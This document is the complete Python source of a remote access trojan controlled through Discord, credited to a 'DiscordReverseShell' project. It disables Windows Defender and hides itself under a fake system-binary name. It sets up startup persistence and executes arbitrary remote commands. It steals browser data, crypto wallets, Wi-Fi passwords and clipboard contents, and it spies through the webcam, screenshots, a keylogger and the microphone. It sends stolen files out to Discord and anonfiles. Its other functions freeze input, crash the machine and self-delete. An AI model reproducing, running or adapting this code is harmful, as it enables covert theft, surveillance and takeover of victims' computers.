import os, discord, subprocess, requests, ctypes, zipfile, threading, keyboard, winreg
from pynput.mouse import Controller
from PIL import ImageGrab, Image
import cv2, pyaudio, datetime
#from tkinter import messagebox
import sys
from config import TOKEN, GUILD_ID, DEFENDER, ERROR, MOVE, ANTIDEBUG
from modules.browser import run, delete_files
from modules.keylogger import Keylogger
from modules.antidebug import Antidebug
from modules.info import start
from modules.wifi import WifiPasswords
from pyperclip import paste
from modules.startup import Startup
from modules.mic import RecordMic


if ANTIDEBUG:
    try:
        if Antidebug().main():
            sys.exit(1)
    except: pass

def disable_defender():
    #C:\> Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && Set-MpPreference -SubmitSamplesConsent 2
    cmd = "powershell Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && powershell Set-MpPreference -SubmitSamplesConsent 2"
    try:
        subprocess.run(cmd, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
    except:
        pass
    
if DEFENDER:
    disable_defender()


def copyfile(file, target):
    try:
        with open(file, "rb") as f:
            bins = f.read()

        with open(target, "wb") as f:
            f.write(bins)
    except: return

file_dir = sys.argv[0]

def move():
    try:
        target_dir = f"{os.getenv('appdata')}\MicrosoftWindows\System"
        
        if not os.path.exists(target_dir):
            os.mkdir(f"{os.getenv('appdata')}\MicrosoftWindows")
            os.mkdir(target_dir)
        
        #shutil.copyfile(file_dir, f"{target_dir}\SystemBin_64bit.exe")

        copyfile(file_dir, f"{target_dir}\SystemBin_64bit.exe")

        try:
            os.chdir(target_dir)
            subprocess.Popen(f"{target_dir}\SystemBin_64bit.exe", shell=True, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP)
            os.chdir(os.path.dirname(sys.argv[0]))
            sys.exit(0)
        except:
            pass
        os.chdir(os.path.dirname(sys.argv[0]))
    except:
        os.chdir(os.path.dirname(sys.argv[0]))
        return
    
    
if MOVE and file_dir[:1].upper() + file_dir[1:] != f"{os.getenv('appdata')}\MicrosoftWindows\System\SystemBin_64bit.exe":
    move()


#def error():
#    messagebox.showerror("Fatal Error", "Error code: 0x80070002\nAn internal error occurred while importing modules.")
#    
#if ERROR:
#    error_t = threading.Thread(target=error, daemon=True).start()


login = os.getlogin()
client = discord.Client(intents=discord.Intents.all())
session_id = os.urandom(8).hex()
freezed = False
#original_dir = os.path.dirname(__file__)


#opus_path = os.path.join(os.path.dirname(sys.argv[0]), "libopus-0.x64.dll")
#discord.opus.load_opus(opus_path)




def check_token(token):
    headers = {
        "Authorization": f"Bot {token}"
    }

    url = "https://discord.com/api/v10/users/@me"
    try:
        response = requests.get(url, headers=headers)
    except:
        return False
    
    if response.status_code == 200:
        return True
    else:
        return False

def check_internet():
    try:
        response = requests.get("http://www.google.com", timeout=5)
        response.raise_for_status()
        return True
    except requests.RequestException:
        return False
    


commands = "\n".join([
    "help - Help command",
    "ping - Ping command",
    "sys - System information",
    "clipboard - Return clipboard content",
    "processes - Get all running processes",
    "cd - Change directory",
    "ls - List directory",
    "cwd - Get current working directory",
    "download <file> - Download file",
    "upload <link> - Upload file",
    "cmd <command> - Execute cmd command",
    "pw <command> - Execute powershell command",
    "run <file> - Run an file",
    "zip <path> - Zip and file or folder",
    "wifi - Return wifi passwords",
    "screenshot - Take a screenshot",
    "webcam - Get image of webcam",
    "bluescreen - Blue screen victim",
    "startup - Add to startup",
    "browser - Get browser data",
    "wallet - Get wallet information",
    "keylogger - Enable keylogger",
    "mic - Record 120 seconds recordings of microphone and send them",
    "join - Joins or leaves voice channel where it streams live microphone",
    "freeze <1/0> - Freeze all inputs from keyboard and mouse",
    "clone <path> - Clone the malware to the specified path, make sure to enter path whit name of the output file",
    "regedit <1 / 2 / 3> <key path> <value name> OR regedit 2 <key path> <value name> <value type: string / expandable_string / multi_string / dword / qword / binary> <value data> - Regedit: 1 - Show value, 2 - Create value, 3 - Delete value",
    "!quit - Exit session without deleting all the data",
    "!exit - Exit session and delete all data",
    "!selfdestruct - Remove the malware from the victims machine along whit all 'evidence'"
])



def encrypt(file, key):
    if os.path.exists(file):
        try:
            content = open(file, "rb").read()
            encrypted = key.encrypt(content)
            open(file, "wb").write(encrypted)
        except: return False
    else: return False
    
def decrypt(file, key):
    if os.path.exists(file):
        try:
            content = open(file, "rb").read()
            encrypted = key.decrypt(content)
            open(file, "wb").write(encrypted)
        except: return False
    else: return False


class PyAudioPCM(discord.AudioSource):
    def __init__(self, channels=2, rate=48000, chunk=960, input_device=1):
        self.chunks = chunk
        self.stream = pyaudio.PyAudio().open(format=pyaudio.paInt16, channels=channels, rate=rate, input=True, input_device_index=input_device, frames_per_buffer=chunk)

    def read(self):
        return self.stream.read(self.chunks)



async def wallets(channel):
    USER_DIR = os.path.expanduser("~")

    EXODUS_DIR = os.path.join(USER_DIR, "AppData", "Roaming", "Exodus", "exodus.wallet")
    ELECTRUM_DIR = os.path.join(USER_DIR, "AppData", "Roaming", "Electrum", "wallets")

    if os.path.exists(EXODUS_DIR):
        exodus_zip = zipfile.ZipFile("Exodus.zip", "w", zipfile.ZIP_DEFLATED)
        for root, dirs, files in os.walk(EXODUS_DIR):
            for file in files:
                exodus_zip.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), EXODUS_DIR))
        exodus_zip.close()

        try:
            #with open("Exodus.zip", "rb") as wallet:
            #    wallet_zip = discord.File(wallet, filename="Exodus.zip")
            #    await channel.send(file=wallet_zip)
            wallet = discord.File("Exodus.zip")
            await channel.send(file=wallet)
        except:
            embed = discord.Embed(title="Error", description=f"Exodus wallet was not found!", color=0xfafafa)
            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
            await channel.send(embed=embed)

        delete_files(["Exodus.zip"])
    
    else:
        embed = discord.Embed(title="Error", description=f"Exodus wallet was not found!", color=0xfafafa)
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        await channel.send(embed=embed)

    if os.path.exists(ELECTRUM_DIR):
        electrum_zip = zipfile.ZipFile("Electrum.zip", "w", zipfile.ZIP_DEFLATED)
        for root, dirs, files in os.walk(ELECTRUM_DIR):
            for file in files:
                electrum_zip.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), ELECTRUM_DIR))
        electrum_zip.close()

        try:
            #with open("Electrum.zip", "rb") as wallet:
            #    wallet_zip = discord.File(wallet, filename="Electrum.zip")
            #    await channel.send(file=wallet_zip)
            wallet = discord.File("Electrum.zip")
            await channel.send(file=wallet)
        except:
            embed = discord.Embed(title="Error", description=f"Electrum wallet was not found!", color=0xfafafa)
            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
            await channel.send(embed=embed)

        delete_files(["Electrum.zip"])
        
    else:
        embed = discord.Embed(title="Error", description=f"Electrum wallet was not found!", color=0xfafafa)
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        await channel.send(embed=embed)
        

async def browsers(channel):
    run()
    zip_files = []

    dir = os.getcwd()
    for filename in os.listdir(dir):
        if filename.endswith(".zip"):
            filepath = os.path.join(dir, filename)
            with zipfile.ZipFile(filepath, "r") as zip_file:
                if len(zip_file.namelist()) != 0:
                    zip_files.append(filepath)

    for file in zip_files:
        try:
            browser_data = discord.File(file, filename=os.path.basename(file))
            await channel.send(file=browser_data)
        except:
            embed = discord.Embed(title="Error", description=f"Browser data was not found!", color=0xfafafa)
            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
            await channel.send(embed=embed)

    delete_files(["Chrome.zip", "Opera.zip", "OperaGX.zip", "Brave.zip", "Edge.zip", "Chromium.zip"])


def freeze():
    global blocking
    blocking = True
    block = threading.Thread(target=block_input, daemon=True)
    block.start()
            
def block_input():
    global blocking
    mouse = Controller()
    for i in range(150):
        try: keyboard.block_key(i)
        except: pass

    while blocking:
        mouse.position = (0, 0)

def unblock_input():
    global blocking
    blocking = False
    
    for i in range(150):
        try: keyboard.unblock_key(i)
        except: pass


def zip(path):
    name = f"{os.path.basename(path)}.zip"

    if os.path.isfile(path):
        try:
            with zipfile.ZipFile(name, "w", zipfile.ZIP_DEFLATED) as f: f.write(path, os.path.basename(path))
            return True
        except: return False
        
    elif os.path.isdir(path):
        try:
            with zipfile.ZipFile(name, "w", zipfile.ZIP_DEFLATED) as f:
                for root, _, files in os.walk(path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        f.write(file_path, os.path.relpath(file_path, path))

            return True
        except: return False

    else: return False


@client.event
async def on_ready():
    try:
        guild = client.get_guild(int(GUILD_ID))
        channel = await guild.create_text_channel(session_id)
        embed = discord.Embed(title="New session created", description="", color=0xfafafa)
        embed.add_field(name="Session ID", value=f"```{session_id}```", inline=True)
        
        start()
        with open("system.txt", "r") as f:
            system_info = f.read()
        if system_info == "":
            system_info = "Failed to fetch system information!"
        
        embed.add_field(name="System Info", value=f"```{system_info}```", inline=False)
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        await channel.send(embed=embed)
        delete_files(["system.txt"])
        #browsers(channel)
    except: sys.exit(0)


@client.event
async def on_message(message): 
    if message.author == client.user: #if message.author == client.user or message.channel.name != session_id:
        return

    if message.channel.name != session_id:
        return

    if message.webhook_id is not None:
        return

#HELP    
    if message.content == "help":
        embed = discord.Embed(title="Help", description=f"```{commands}```", color=0xfafafa)
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        await message.reply(embed=embed)

#PING
    elif message.content == "ping":
        await message.reply(f"PONG, `{round(client.latency * 1000)}ms`")

#! SYSTEM INFO
    elif message.content == "sys":
        await message.reply("Fetching data...", delete_after=.3)
        start()
        with open("system.txt", "r") as f:
            system_info = f.read()

        if system_info == "":
            system_info = "Failed to fetch system information!"

        embed = discord.Embed(title="System Information", description=f"```{system_info}```", color=0xfafafa)
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        await message.channel.send(embed=embed)
        delete_files(["system.txt"])

#! CLIPBOARD
    elif message.content == "clipboard":
        try:
            clipboard = paste()
        except:
            clipboard = "Unknown"
        if clipboard == "":
            clipboard = "null"
        elif len(clipboard) > 1500:
            with open("clipboard.txt", "w", encoding="utf-8") as f:
                f.write(clipboard)
            clipboard_file = discord.File("clipboard.txt")
            await message.reply(file=clipboard_file)
            delete_files(["clipboard.txt"])
            return
        
        embed = discord.Embed(title="Clipboard Content", description=f"```{clipboard}```", color=0xfafafa)
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        await message.reply(embed=embed)

#! PROCESSES    
    elif message.content == "processes":
        try: 
            tasks = os.popen("tasklist").read()
        except:
            await message.reply("Failed to fetch task list!") 
            return


        if len(tasks) > 1500:
            with open("tasklist.txt", "w", encoding="utf-8") as f:
                f.write(tasks)
            await message.reply(file=discord.File("tasklist.txt"))
            delete_files(["tasklist.txt"])
        else:
            embed = discord.Embed(title="Processes", description=f"```{tasks}```", color=0xfafafa)
            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
            await message.reply(embed=embed)
    
#! CD
    elif message.content.startswith("cd "):
        directory = message.content[3:] #.split(" ")[1]
        if directory == "///root": 
            os.chdir(os.path.dirname(sys.argv[0]))
            embed = discord.Embed(title="Changed Directory to ROOT", description=f"```{os.getcwd()}```", color=0xfafafa)
            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
            await message.reply(embed=embed)
            return
        try:
            os.chdir(directory)
            embed = discord.Embed(title="Changed Directory", description=f"```{os.getcwd()}```", color=0xfafafa)
        except:
            embed = discord.Embed(title="Error", description=f"```Directory Not Found```", color=0xfafafa)
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        await message.reply(embed=embed)

#! LS
    elif message.content == "ls":
        files = "\n".join(os.listdir())
        if files == "":
            files = "No Files Found"
            
        elif len(files) > 1500:
            with open("files.txt", "w", encoding="utf-8") as f:
                f.write(files)
            file = discord.File("files.txt")
            embed = discord.Embed(title=f"Files > {os.getcwd()}", description="", color=0xfafafa)
            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
            await message.reply(file=file, embed=embed)
            delete_files(["files.txt"])
            return
        
        embed = discord.Embed(title=f"Files > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        await message.reply(embed=embed)

#! CWD    
    elif message.content == "cwd":
        embed = discord.Embed(title="CWD", description=f"```{os.getcwd()}```", color=0xfafafa) #{os.path.basename(link)}
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        await message.reply(embed=embed)

#! ZIP
    elif message.content.startswith("zip "):
        path = message.content[4:]
        name = f"{os.path.basename(path)}.zip"

        if os.path.exists(path):
            if zip(path):
                embed = discord.Embed(title="Zip", description=f"```Zipped file: {path} to {name}```", color=0xfafafa)
                embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
                await message.reply(embed=embed)
            else:
                embed = discord.Embed(title="Zip", description=f"```Failed to zip file: '{path}'!```", color=0xfafafa)
                embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
                await message.reply(embed=embed)
        else:
            embed = discord.Embed(title="Zip", description="```Invalid path!```", color=0xfafafa)
            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
            await message.reply(embed=embed)


#! DOWNLOAD
    elif message.content.startswith("download"):
        file = message.content[9:] #.split(" ")[1]
        try:
            link = requests.post("https://api.anonfiles.com/upload", files={"file": open(file, "rb")}).json()["data"]["file"]["url"]["full"]
            embed = discord.Embed(title="Download", description=f"```{link}```", color=0xfafafa)
            #await message.reply(embed=embed)
        except:
            embed = discord.Embed(title="Error", description=f"```File Not Found```", color=0xfafafa)
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        await message.reply(embed=embed)

#! UPLOAD
    elif message.content.startswith("upload"):
        link = message.content[7:] #.split(" ")[1]
        try:
            file = requests.get(link).content
            with open(os.path.basename(link), "wb") as f:
                f.write(file)
        except:
            await message.reply("Failed to upload the file!")
            return
        embed = discord.Embed(title="Upload", description=f"```{os.getcwd()}\{os.path.basename(link)}```", color=0xfafafa)
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        await message.reply(embed=embed)

#! CMD
    elif message.content.startswith("cmd "):
        command = message.content[4:]
        try:
            output = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True).communicate()#[0].decode("utf-8") #   , creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP
            error_output = output[1].decode("utf-8")
            normal_output = output[0].decode("utf-8")
        except:
            await message.reply("Failed to execute pw command!")
            return
        
        embed = discord.Embed(title=f"{os.getcwd()}", description="", color=0xfafafa)
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        
        if len(normal_output) > 1500:
            with open("output.txt", "w", encoding="utf-8") as f:
                f.write(normal_output)
            
            file = discord.File("output.txt")
            await message.reply(file=file, embed=embed)
            delete_files(["output.txt"])
            return
        elif normal_output != "":
            embed.add_field(name="Output", value=f"```{normal_output}```", inline=False)
            
             
        if len(error_output) > 1500:
            with open("error.txt", "w", encoding="utf-8") as f:
                f.write(error_output)
            
            file = discord.File("error.txt")
            await message.reply(file=file, embed=embed)
            delete_files(["error.txt"])
            return      
        elif error_output != "":
            embed.add_field(name="Error", value=f"```{error_output}```", inline=False)
            
            
        if error_output == "" and normal_output == "":
            embed.add_field(name="Output", value="```No Output!```", inline=False)
            
        await message.reply(embed=embed)
        
#! POWERSHELL    
    elif message.content.startswith("pw "):
        command = message.content[3:]
        try:
            output = subprocess.Popen(["powershell", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP).communicate()#[0].decode("utf-8") #  , creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP
            error_output = output[1].decode("utf-8")
            normal_output = output[0].decode("utf-8")
        except:
            await message.reply("Failed to execute pw command!")
            return
        
        embed = discord.Embed(title=f"{os.getcwd()}", description="", color=0xfafafa) # description=f"```{output}```",
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        
        if len(normal_output) > 1500:
            with open("output.txt", "w", encoding="utf-8") as f:
                f.write(normal_output)
            
            file = discord.File("output.txt")
            await message.reply(file=file, embed=embed)
            delete_files(["output.txt"])
            return
        elif normal_output != "":
            embed.add_field(name="Output", value=f"```{normal_output}```", inline=False)


        if len(error_output) > 1500:
            with open("error.txt", "w", encoding="utf-8") as f:
                f.write(error_output)
            
            file = discord.File("error.txt")
            await message.reply(file=file, embed=embed)
            delete_files(["error.txt"])
            return
        elif error_output != "":
            embed.add_field(name="Error", value=f"```{error_output}```", inline=False)
            
            
        if error_output == "" and normal_output == "":
            embed.add_field(name="Output", value="```No Output!```", inline=False)
            
        await message.reply(embed=embed)

#! RUN
    elif message.content.startswith("run "):
        file = message.content[4:]
        if file == "":
            message.reply("Please specify a file to run!")
        try:
            output = subprocess.Popen(file, shell=True, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP)
            embed = discord.Embed(title="Started", description=f"```{file}\n{output}```", color=0xfafafa)
        except:
            embed = discord.Embed(title="Error", description=f"```Failed to start: {file}```", color=0xfafafa)
            #await message.reply(embed=embed)
            #return
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        await message.reply(embed=embed)

#! STARTUP
    elif message.content == "startup":
        Startup(sys.argv[0])
        await message.reply("Startup Enabled!")
        
#! BLUESCREEN    
    elif message.content == "bluescreen":
        await message.reply("Attempting...", delete_after=.1)
        try:
            ntdll = ctypes.windll.ntdll
            prev_value = ctypes.c_bool()
            res = ctypes.c_ulong()
            ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
        except:
            await message.reply("Bluescreen Failed!")
            return
        
        if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
            await message.reply("Bluescreen Successful!")
        else:
            await message.reply("Bluescreen Failed!")

#! WIFI
    elif message.content == "wifi":
        WifiPasswords().run()
        with open("wifi.txt", "r") as f:
            wifi = f.read()
        if wifi == "":
            wifi = "No wifi passwords found!"
        elif len(wifi) > 1500:
            file = discord.File("wifi.txt")
            await message.reply(file=file)
            delete_files(["wifi.txt"])
            return
        
        embed = discord.Embed(title="Wifi Passwords", description=f"```{wifi}```", color=0xfafafa)
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        await message.reply(embed=embed)
        delete_files(["wifi.txt"])

#! SCREENSHOT
    elif message.content == "screenshot":
        try:
            screenshot = ImageGrab.grab(all_screens=True)
            path = os.path.join(os.getenv("TEMP"), "screenshot.png")
            screenshot.save(path)
        except:
            await message.reply("Failed to take screenshot!")
            return
        file = discord.File(path)
        embed = discord.Embed(title="Screenshot", color=0xfafafa)
        embed.set_image(url="attachment://screenshot.png")
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        await message.reply(embed=embed, file=file)

#! WEBCAM
    elif message.content == "webcam":
        try:
            cap = cv2.VideoCapture(0)
            x, frame = cap.read()

            img = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            image = Image.fromarray(img)

            path = os.path.join(os.getenv("TEMP"), "webcam.png")
            image.save(path)
            cap.release()
        except:
            await message.reply("No webcams found!")
            return
        webcam = discord.File(path)
        embed = discord.Embed(title="Webcam", color=0xfafafa)
        embed.set_image(url="attachment://webcam.png")
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        await message.reply(embed=embed, file=webcam)

#! BROWSER
    elif message.content == "browser":
        await browsers(message.channel)

#! WALLETS
    elif message.content == "wallet":
        await wallets(message.channel)
    
#! KEYLOGGER
    elif message.content == "keylogger":
        await message.reply("Creating new webhook for keylogger...")
        try:
            global keylogger
            webhook = await message.channel.create_webhook(name="Keylogger")
            await message.reply(f"Created webhook, using URL: {webhook.url}")
            keylogger = threading.Thread(target=Keylogger(webhook.url).run, daemon=True)
            keylogger.start()
            
            #Keylogger(webhook.url).run()
        except:
            await message.reply(f"Failed to create new webhook!")
            return
        
        await message.reply("Keylogger enabled!")
    
    #elif message.content == "keylogger stop":
    #    #keylogger.stop()
    #    keylogger.join()


#! FREEZE
    elif message.content.startswith("freeze "):
        action = message.content[7:]
        
        if action == "1":
            if freezed:
                await message.reply("Inputs are already freezed!")
            else:
                freeze()
                freezed = True
                await message.reply("Inputs are now freezed!")
        
        elif action == "0":
            if not freezed:
                await message.reply("Inputs are not freezed!")
            else:
                unblock_input()
                freezed = False
                await message.reply("Inputs are unfrezzed!")
        

#! CLONE
    elif message.content.startswith("clone "):
        path = message.content[6:]
        _, extension = os.path.splitext(path)
        dir = os.path.dirname(path)
        

        if not os.path.exists(dir):
            await message.reply("Invalid path, please try again with valid path!")
            return

        if extension != ".exe":
            await message.reply("Invalid extension, please try again with valid extension(.exe)!")
            return

        try:            
            #shutil.copyfile(file_dir, f"{target_dir}\SystemBin_64bit.exe")
            copyfile(sys.argv[0], path)

            try:
                os.chdir(dir)
                subprocess.Popen(path, shell=True, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP)
            except:
                await message.reply("Failed to clone the malware, please try again and make sure to use valid path!")
                os.chdir(os.path.dirname(sys.argv[0]))
                return
        except:
            await message.reply("Failed to clone the malware, please try again and make sure to use valid path!")
            os.chdir(os.path.dirname(sys.argv[0]))
            return
        os.chdir(os.path.dirname(sys.argv[0]))
        embed = discord.Embed(title="Clone", description=f"```Successfully cloned to: {path}```", color=0xfafafa)
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        await message.reply(embed=embed)
    

#! REGEDIT
    elif message.content.startswith("regedit "):
        action = message.content[8:9]


        if action == "1":
            try:
                data = message.content[10:].split(" ")
                
                root_path, key_path = data[0].split("\\", 1)
                root_key = winreg.ConnectRegistry(None, getattr(winreg, root_path))
                key = winreg.OpenKey(root_key, key_path, 0, winreg.KEY_READ)

                value_name = data[1]
                value, type = winreg.QueryValueEx(key, value_name)
                winreg.CloseKey(key)

                embed = discord.Embed(title="Regedit", description=f"```Value Path: {root_path}\\{key_path}\\{value_name}\nValue: {value}\nValue type: {type}```", color=0xfafafa)
                embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
                await message.reply(embed=embed)
            except:
                embed = discord.Embed(title="Regedit", description="```Invalid key path or value name!```", color=0xfafafa)
                embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
                await message.reply(embed=embed)

        elif action == "2":
            try:
                data = message.content[10:].split(" ")
                
                root_path, key_path = data[0].split("\\", 1)
                root_key = winreg.ConnectRegistry(None, getattr(winreg, root_path))
                key = winreg.OpenKey(root_key, key_path, 0, winreg.KEY_READ)

                value_name = data[1]
                value_data = data[3]
                value_types = {
                    "string": winreg.REG_SZ,
                    "expandable_string": winreg.REG_EXPAND_SZ,
                    "multi_string": winreg.REG_MULTI_SZ,
                    "dword": winreg.REG_DWORD,
                    "qword": winreg.REG_QWORD,
                    "binary": winreg.REG_BINARY,
                }
                value_type = value_types[data[2]]

                winreg.SetValueEx(key, value_name, 0, value_type, value_data)

                winreg.CloseKey(key)
                embed = discord.Embed(title="Regedit", description=f"```Created new value: {value_name}\nValue data: {value_data}\nValue type: {value_type}\nKey path: {data[0]}```", color=0xfafafa)
                embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
                await message.reply(embed=embed)
            except Exception as e:
                embed = discord.Embed(title="Regedit", description=f"```Invalid key path or value name!\nERROR: {e}```", color=0xfafafa)
                embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
                await message.reply(embed=embed)
                return

        elif action == "3":
            try:
                data = message.content[10:].split(" ")
                
                root_path, key_path = data[0].split("\\", 1)
                root_key = winreg.ConnectRegistry(None, getattr(winreg, root_path))
                key = winreg.OpenKey(root_key, key_path, 0, winreg.KEY_READ)

                value_name = data[1]
                winreg.DeleteValue(key, value_name)

                winreg.CloseKey(key)
                embed = discord.Embed(title="Regedit", description=f"```Deleted value: {value_name}\nPath: {data[0]}```", color=0xfafafa)
                embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
                await message.reply(embed=embed)
            except:
                embed = discord.Embed(title="Regedit", description="```Invalid key path or value name```", color=0xfafafa)
                embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
                await message.reply(embed=embed)
                return
        else:
            embed = discord.Embed(title="Regedit", description="```Invalid command, make sure to structure your command like this:\nregedit <1 / 3> <key path> <value name>\nOR\nregedit 2 <key path> <value name> <value type: string / expandable_string / multi_string / dword / qword / binary> <value data>```", color=0xfafafa)
            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
            await message.reply(embed=embed)


#! MIC
    elif message.content == "mic":
        await message.reply("Creating new webhook for microphone...")
        try:
            webhook = await message.channel.create_webhook(name="Mic")
            await message.reply(f"Created webhook, using URL: {webhook.url}")
            mic_recorder = threading.Thread(target=RecordMic, args=(120, webhook.url), daemon=True)
            mic_recorder.start()
        except:
            await message.reply(f"Failed to create new webhook!")
            return
        
        await message.reply("Mic recorder enabled!")


#! LIVE MIC
    elif message.content == "join":
        time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        global vc, voice_channel
        try: 
            vc.stop()
            await voice_channel.delete()

            embed = discord.Embed(title="Live mic", description=f"```Stopped live mic:\n{time}```", color=0xfafafa)
            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
            await message.reply(embed=embed)
            return
        except: pass

        try:
            #global vc, voice_channel

            guild = message.guild
            voice_channel = await guild.create_voice_channel(f"mic-{session_id}")
            vc = await voice_channel.connect(self_deaf=True)
            vc.play(PyAudioPCM(channels=1))

            embed = discord.Embed(title="Live mic", description=f"```Started live mic:\n{time}```", color=0xfafafa)
            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
            await message.reply(embed=embed)
        except: pass


#SELF DESTRUCT
    elif message.content.startswith("!selfdestruct"):
        if message.content.startswith("!selfdestruct CONFIRM"):
            #args = message.content[22:]
            shortcut_dir = f"{os.getenv('appdata')}\Microsoft\Windows\Start Menu\Programs\Startup\SystemBin_64bit.lnk"
            if os.path.exists(shortcut_dir): delete_files([shortcut_dir])

            embed = discord.Embed(title="Self destruct",  description="```Self destruction started!```", color=0xfafafa)
            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
            await message.reply(embed=embed)

            try: 
                vc.stop()
                await voice_channel.delete()
            except: pass
            await client.close()

            #cmd = f"powershell Start-Sleep -Seconds 5; Remove-Item -Path '{dir}' -Recurse -Force"
            cmd = f"powershell Start-Sleep -Seconds 5; Remove-Item -Path '{sys.argv[0]}'"
            subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP)
            sys.exit(0)
        else:
            embed = discord.Embed(title="Self destruct",  description="```Please use '!selfdestruct CONFIRM' to confirm this action!```", color=0xfafafa)
            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
            await message.reply(embed=embed)

#QUIT
    elif message.content == "!quit":
        try: 
            vc.stop()
            await voice_channel.delete()
        except: pass
        await client.close()

#EXIT  
    elif message.content == "!exit":
        try: 
            vc.stop()
            await voice_channel.delete()
        except: pass
        await message.channel.delete()
        await client.close()
       
    else:
        embed = discord.Embed(title="Error", description="```Unknown command, use 'help' for full list of commands!```", color=0xfafafa)
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        await message.reply(embed=embed)


if check_internet():
    if check_token(TOKEN):
        try:
            client.run(TOKEN)
        except:
            pass
else: Startup(sys.argv[0])


#subprocess.run(["shutdown", "/s", "/t", "0"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

#subprocess.run(["shutdown", "/r", "/t", "0"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

